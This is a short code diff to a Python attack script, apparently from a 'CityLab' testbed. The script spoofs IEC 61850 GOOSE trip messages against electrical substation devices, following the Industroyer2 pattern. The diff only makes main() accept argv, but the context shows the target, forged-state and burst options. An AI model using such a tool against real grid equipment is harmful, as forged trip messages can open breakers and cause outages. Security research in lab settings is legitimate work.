@@ -16,7 +16,7 @@ import socket
 import sys
 import time
 from pathlib import Path
-from typing import Optional
+from typing import Optional, Sequence
 
 ROOT = Path(__file__).resolve().parent.parent
 if str(ROOT) not in sys.path:
@@ -64,14 +64,14 @@ def spoof_goose_trip(
     return pdu
 
 
-def main() -> int:
+def main(argv: Optional[Sequence[str]] = None) -> int:
     parser = argparse.ArgumentParser(description="CityLab IEC 61850 GOOSE Spoofing Attack (Industroyer2 Pattern)")
     parser.add_argument("--host", default="127.0.0.1", help="Host/IP objetivo del IED o red multicast (default: 127.0.0.1)")
     parser.add_argument("--port", type=int, default=DEFAULT_GOOSE_PORT, help=f"Puerto UDP GOOSE (default: {DEFAULT_GOOSE_PORT})")
     parser.add_argument("--ied", default="CITYLAB_IED1", help="Nombre del IED objetivo (default: CITYLAB_IED1)")
     parser.add_argument("--stnum", type=int, default=100, help="Número de estado falsificado stNum (default: 100)")
     parser.add_argument("--burst", type=int, default=5, help="Número de ráfagas GOOSE a transmitir (default: 5)")
-    args = parser.parse_args()
+    args = parser.parse_args(argv)
 
     LOGGER.info("Iniciando vector de ataque GOOSE Spoofing contra subestación eléctrica...")
     for i in range(args.burst):
